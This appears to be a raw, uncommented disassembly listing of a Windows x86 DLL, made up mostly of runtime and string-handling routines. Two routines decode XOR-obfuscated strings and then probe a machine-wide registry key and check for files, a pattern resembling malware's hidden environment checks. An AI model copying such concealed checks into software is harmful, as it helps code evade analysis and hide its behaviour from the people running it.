mov esi ecx
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
push r--data
mov [ ecx ] eax
mov [ ecx + 0x4 ] al
call sub_10024880
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10004286
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1004a962
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_1005b670
mov [ eax ] edi
call sub_1004b131
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10032529
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_1000f461
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10082c62
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_10082dc3
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_10004373
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_10030ff0
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_10030ff0
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_10030ff0
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_10030ff0
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_10030ff0
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
push 0x2
cmp eax ebx
mov [ ebp - 0x4 ] eax
pop ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] ebx
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ebx [ ebp - 0xc ]
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ebx [ ebp - 0xc ]
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001be36
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001be36
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
cmp [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1000eff4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
mov ebx [ ebp - 0x8 ]
cmp [ ebp + 0x12 ] bx
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001be36
or [ esi ] eax
add esp 0x18
dec [ ebx ]
mov ebx [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001be36
add esp 0x18
or [ esi ] eax
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
movzx ecx [ ebp + 0x12 ]
movzx eax bx
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001be36
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1001be36
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
sub_10004850
cmp edx ebx
je r-xdata
retn
push esi
push edi
add edx 0x20
add eax 0x20
cmp edx ebx
jne r-xdata
mov ecx 0x8
mov esi edx
mov edi eax
[ edi ] [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
sub_10004880
push ebp
mov ebp esp
sub esp 0x78
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffee
and edx 0xff
mov [ ebp + eax * 2 - 0x68 ] dx
inc eax
cmp eax 0x27
jb r-xdata
lea ecx [ ebp - 0x6c ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0x68 ]
push edx
push 0x80000002
mov [ ebp - 0x1a ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push esi
lea edx [ ebp - 0x18 ]
mov eax 0x18
call sub_10019570
lea edx [ ebp - 0x74 ]
push edx
lea eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x6c ]
lea ecx [ ebp - 0x70 ]
push ecx
push 0x0
lea edx [ ebp - 0x18 ]
push edx
push eax
mov [ ebp - 0x74 ] 0x4
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
xor ecx ecx
cmp eax 0x2
setne cl
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x6c ]
push edx
call [ RegCloseKey@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x6c ]
push ecx
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi 0x2
setne al
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x70 ] 0x4
je r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ebp - 0x78 ] eax
pop esi
setne al
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1000498f
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_10051cf5
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1005b670
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1001b8e5
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_100718ba
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10030370
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10004ab0
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x4c
and edx 0xff
mov [ ebp + eax * 2 - 0x58 ] dx
inc eax
cmp eax 0x28
jb r-xdata
push esi
mov esi [ GetFileAttributesW@IAT ]
lea ecx [ ebp - 0x58 ]
xor eax eax
push ecx
mov [ ebp - 0x8 ] ax
call esi
cmp eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x10
call sub_10037e30
push edx
call esi
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop esi
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10004b50
push ebp
mov ebp esp
mov eax [ esi ]
push edi
mov edi [ GetProcessHeap@IAT ]
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
lea ecx [ edx * 4 + 0x4 ]
push ecx
push eax
push 0x8
call edi
push eax
call [ HeapReAlloc@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ eax * 4 + 0x4 ]
push ecx
push 0x8
call edi
push eax
call [ HeapAlloc@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov [ esi ] eax
mov eax 0x2
pop edi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ lstrlenW@IAT ]
push edx
call ebx
lea eax [ eax + eax + 0x2 ]
push eax
push 0x8
call edi
push eax
call [ HeapAlloc@IAT ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov [ edx + ecx * 4 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
mov eax 0x1
pop edi
pop ebp
retn 0x4
mov edi [ ebp + 0x8 ]
push edi
call ebx
mov edx [ esi + 0x4 ]
add eax eax
push eax
mov eax [ esi ]
mov ecx [ eax + edx * 4 ]
push edi
push ecx
call sub_1007f580
inc [ esi + 0x4 ]
add esp 0xc
pop ebx
xor eax eax
pop edi
pop ebp
retn 0x4
pop ebx
mov eax 0x3
pop edi
pop ebp
retn 0x4
sub_10004c10
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_1003e780
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10004c50
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_10027450
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10004c7b
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1005aa2b
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003e904
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_10004cbc
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
mov edi [ ebp + 0x14 ]
movzx eax [ esi ]
push [ ebp + 0x10 ]
mov ecx ebx
push eax
call sub_1000f245
add esi 0x2
mov [ edi ] al
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10004d16
push 0x28
mov eax sub_10085530
call sub_10026266
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x5
pop eax
call sub_10008d33
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_1002e3ac
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000b97c
jmp r-xdata
sub_10004d98
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_1005f4bc
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_10069c20
pop ecx
mov ebx eax
call sub_1005b670
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_1007f8f0
add esp 0xc
sub_10004e10
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_100651be
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_10030594
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10030594
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10045c60
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add ecx [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ esi + 0x10 ]
add ecx eax
push ecx
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10004efc
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000c429
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_10005050
push esi
mov esi ecx
mov eax [ esi + 0x98 ]
test eax eax
je r-xdata
pop esi
retn
mov ecx [ esi + 0x9c ]
push 0x8000
push ecx
push eax
call [ VirtualFree@IAT ]
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x9c ] 0x0
sub_10005090
push ebp
mov ebp esp
push 0xffffffff
push sub_10087b59
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] cx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ edx + 0x10 ]
add eax [ ebx + 0x10 ]
mov edi [ esi + 0x10 ]
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_1006da10
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_1006da10
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10068c70
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10005140
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov ebx ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx ebx
call sub_10068490
mov edi edx
mov esi eax
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
mov ecx ebx
call edx
or edx 0xffffffff
cmp eax edx
je r-xdata
jg r-xdata
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
inc ecx
add [ esp + 0x10 ] 0x1
mov [ ecx - 0x1 ] al
mov [ ebp + 0x8 ] ecx
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] edx
adc [ ebp + 0x10 ] edx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push edx
